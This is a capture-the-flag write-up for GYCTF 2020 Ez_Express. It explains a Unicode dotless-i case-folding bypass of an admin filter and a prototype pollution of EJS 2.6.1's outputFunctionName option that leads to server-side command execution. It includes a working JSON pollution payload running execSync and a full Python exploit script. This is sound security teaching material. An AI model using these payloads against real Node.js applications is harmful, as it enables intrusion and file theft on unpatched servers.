# GYCTF 2020 Ez_Express — Unicode Case Folding + EJS Prototype Pollution

> **Flag**: `flag{15f3bdae-1dbf-4e75-a7dc-f2bd50cff419}`
>
> A two-stage Node.js challenge that I keep coming back to as the canonical example of "the bug is the same as the official primitive, but you can't get to it until you defeat an unrelated filter". The filter is a `.toUpperCase()` based authorization check — defeatable by a single Unicode codepoint (`U+0131`, dotless i). The reward for that one byte of cleverness is a recursive `merge` call on user JSON, which lets you pollute `Object.prototype.outputFunctionName` and ride it through EJS 2.6.1's compile-time template generation into RCE.

## 0. App overview

| Field | Value |
|---|---|
| Stack | Node.js / Express ~4.16.1 / ejs ~2.6.1 / lodash ^4.17.15 / express-session ^1.17.0 |
| Hint | Source bundle leaked at `/www.zip` (linked from HTML comment on the index) |
| Auth | Must be logged in as session user `"ADMIN"` (uppercase string-equal) to reach `/action` |
| Sink | `/info` calls `res.render('index', { user: res.outputFunctionName })` — an unusual passthrough that *only* makes sense as a deliberate hint |

Two vulnerabilities, used in order:

1. **Authorization bypass** via `String.prototype.toUpperCase()` Unicode behaviour
2. **Prototype pollution → RCE** via recursive merge of JSON input

## 1. Recon

The login page reads "username must be uppercase" and "please log in as ADMIN". Direct registration with `userid=ADMIN`:

```http
POST /login
Submit=register&userid=ADMIN&pwd=x

→ alert('forbid word')
```

So `ADMIN` is blacklisted as input. Some other path has to produce the session value `"ADMIN"`.

Registering any innocuous name reveals an HTML comment on the index pointing at `/www.zip`. The download yields `app.js`, `routes/index.js`, and `package.json`.

## 2. The vulnerable code

```js
// routes/index.js
const merge = (a, b) => {
  for (var attr in b) {
    if (isObject(a[attr]) && isObject(b[attr])) merge(a[attr], b[attr]);
    else a[attr] = b[attr];
  }
  return a;
};
const clone = (a) => merge({}, a);

function safeKeyword(keyword) {
  if (keyword.match(/(admin)/is)) return keyword;   // ← truthy when matched
  return undefined;
}

router.post('/login', (req, res) => {
  if (req.body.Submit == "register") {
    if (safeKeyword(req.body.userid))
      res.end("<script>alert('forbid word');history.go(-1);</script>");

    req.session.user = {
      user: req.body.userid.toUpperCase(),          // ← case folding sink
      passwd: req.body.pwd,
      isLogin: false
    };
    res.redirect('/');
  }
});

router.post('/action', (req, res) => {
  if (req.session.user.user != "ADMIN")
    return res.end("<script>alert('ADMIN is asked');...</script>");
  req.session.user.data = clone(req.body);          // ← __proto__ pollution
  res.end("<script>alert('success');...</script>");
});

router.get('/info', (req, res) => {
  res.render('index', { user: res.outputFunctionName });
  //                          ^^^^^^^^^^^^^^^^^^^^^^^
  //   feeds polluted outputFunctionName into EJS compile()
});
```

Three things to read off this:

1. **The filter and the storage diverge**: `safeKeyword` looks at the *original* input (`req.body.userid`), but `req.session.user.user` stores the *case-folded* result. Anything whose `.toUpperCase()` produces `"ADMIN"` but whose original form doesn't match `/admin/i` slips through.
2. **`merge` has no `__proto__` guard**: this is the textbook lodash-style prototype pollution sink. `clone(req.body)` walks `req.body.__proto__` and assigns through to `Object.prototype`.
3. **`/info` reads `res.outputFunctionName`** explicitly. EJS picks up `outputFunctionName` from its options object. This is the author's signal post — they're telling you the sink is EJS compile.

## 3. Bypassing the filter — Unicode case folding

The candidate characters are Unicode codepoints whose uppercase form is ASCII `I`:

| Char | Codepoint | `.toUpperCase()` | Matches `/admin/i`? |
|---|---|---|---|
| `İ` | U+0130 (Latin capital I with dot above) | `İ` (unchanged) | no — original has no ASCII `i` |
| `ı` | U+0131 (Latin small dotless i) | `I` (ASCII) | no — original has no ASCII `i` |

Both bypass the regex. Only **`ı` (U+0131)** produces ASCII `I` when uppercased.

```
"admın".toUpperCase() === "ADMIN"     // ı → I, then a/d/m/n already upper-mappable
"admİn".toUpperCase() === "ADMİN"     // İ stays itself; result is NOT "ADMIN"
```

The `/action` route does `req.session.user.user != "ADMIN"`. A strict-inequality check on UTF-16 strings. `"ADMİN" != "ADMIN"` is true, so `İ` fails. `"ADMIN"` (real, ASCII) is what we want — only `ı` produces it.

**First attempt with `İ` looked right**: the index page rendered `Hello, ADMİN`, but `/action` kept returning 403. That confused me for a while until I realised the comparison really is byte-for-byte on the post-folded string.

## 4. The EJS gadget — `outputFunctionName`

EJS 2.6.1 `lib/ejs.js`, function `compile()`:

```js
prepended += '  var ' + opts.outputFunctionName + ' = __output;\n';
```

`opts.outputFunctionName` is concatenated into the **source code** of the compiled template function, with no validation. If we can make `opts.outputFunctionName` be any string, we can inject JavaScript that runs at *render time* — server-side.

Since `opts` is just an object EJS receives, and EJS does `opts = opts || {}` followed by attribute reads, every read-miss falls through to `Object.prototype`. Polluting `Object.prototype.outputFunctionName` makes every EJS render use our payload.

The compiled source becomes (schematically):

```js
function anonymous(locals, escapeFn, include, rethrow) {
  var __output = [];
  var <our payload> = __output;     // ← injection point
  ...
}
```

## 5. Crafting the payload

We need the injection site to:

1. Close the `var <ident> = __output;` statement validly (or at least limp through parsing)
2. Run our command
3. Re-open a `var` declaration so the trailing `= __output;` doesn't crash

```
x;global.process.mainModule.require("child_process").execSync("cp /flag /app/public/f.txt");var __tmp2
```

Expanded into the template:

```js
var x;
global.process
      .mainModule
      .require("child_process")
      .execSync("cp /flag /app/public/f.txt");
var __tmp2 = __output;
```

`var x;` parses cleanly. The `execSync` runs synchronously and copies `/flag` to a place we can fetch over HTTP. The trailing `var __tmp2 = __output;` swallows EJS's auto-appended `= __output;`.

### Why exfiltrate to a static file?

EJS compile runs in the context of the template function being **constructed**, before any rendering happens with `req`/`res`. There's no straightforward way to capture stdout from the injected code or pipe data back through the HTTP response. The Express app serves `/app/public/` as static files — copy `/flag` there, then GET it.

`/app/` as app root was confirmed by running `pwd` (via the same RCE) into a sibling file first as a sanity check.

## 6. Full exploit

```python
import requests

URL = "http://<host>:81"
s = requests.Session()

# 1) Register with dotless ı; session.user.user becomes "ADMIN"
s.post(f"{URL}/login", data={
    "userid": "admın",   # note the U+0131 dotless i in the middle
    "pwd":    "x",
    "action": "login",
    "Submit": "register"
}, allow_redirects=False)

# 2) Prototype pollution — outputFunctionName carries the JS injection
s.post(f"{URL}/action", json={
    "__proto__": {
        "outputFunctionName":
            'x;global.process.mainModule.require("child_process")'
            '.execSync("cp /flag /app/public/f.txt");var __tmp2'
    }
})

# 3) Trigger EJS compile path; res.outputFunctionName is read here
s.get(f"{URL}/info")

# 4) Read flag from static route
print(s.get(f"{URL}/f.txt").text)
```

## 7. Traps and lessons learned

| Trap | Why it cost me time | Resolution |
|---|---|---|
| Used `İ` (U+0130) first | Visually `Hello, ADMİN` looked right after registration | Strict `!=` comparison on UTF-16; `"ADMİN" != "ADMIN"` is true. Only `ı` (U+0131) → `I` |
| Read `safeKeyword` as a whitelist | The function name suggested "this returns the keyword if it's safe" | Actually returns the keyword *when it matches blacklist* (truthy → alert). The naming is misleading; read the body |
| Tried to exfil via response | Wanted `execSync('cat /flag')` → see output in HTTP response | EJS compile is upstream of render; no `res` in scope at injection point. Use side channels (file → static, DNS, outbound HTTP) |
| Got "Cannot read property of undefined" the first time | Forgot that `Content-Type: application/json` is required for Express to parse `__proto__` JSON | Set `json=` (requests does this automatically) instead of `data=` |
| Crashed the EJS render after pollution | The first payload had unbalanced braces and broke ALL renders for that session | Test EJS injection on a separate session — if you break it, every subsequent template render fails and you have to redeploy |

## 8. Methodology takeaways

1. **Validate-store mismatches.** When the validator looks at input form X and the storage layer looks at form Y, search for any transformation between them — Unicode case folding, URL decoding, JSON normalisation, HTML entity decode, etc.
2. **Recursive `merge` without `__proto__` guard is always prototype pollution.** This is a pattern, not an exotic bug. Lodash's `defaultsDeep`, `merge`, `set` — all have CVEs. Custom rolled merges almost always reproduce them.
3. **EJS / pug / handlebars compile-time gadgets are documented.** `outputFunctionName`, `destructuredLocals`, `escapeFunction` — these are options the template engines explicitly expose, and they're the natural pollution targets.
4. **Filename character set matters in payloads.** When copying `/flag` to a public-served path, name it something the static-file middleware will serve (extension whitelist often blocks `.flag`). `.txt` works everywhere.
5. **Prototype pollution chains in Node.js: 3 components.** (a) the merge / assign sink that writes to `__proto__`, (b) the property name (`outputFunctionName`, `isAdmin`, `polluted`) the downstream code reads via prototype-chain lookup, (c) a render / eval / RCE-adjacent code path that uses the property unsafely.

## 9. Related techniques

- [LitCTF 2025 multiverse_diary](litctf2025_multiverse_diary.md) *(coming soon)* — Express `isAdmin` prototype pollution variant
- [NPUCTF 2020 验证🐎](npuctf2020_yanzhengma.md) *(coming soon)* — Node.js eval bypass via prototype chain `String → Function`
- [DASCTF 2023 EzFlask](dasctf2023_ezflask.md) — Python's flavour of class pollution
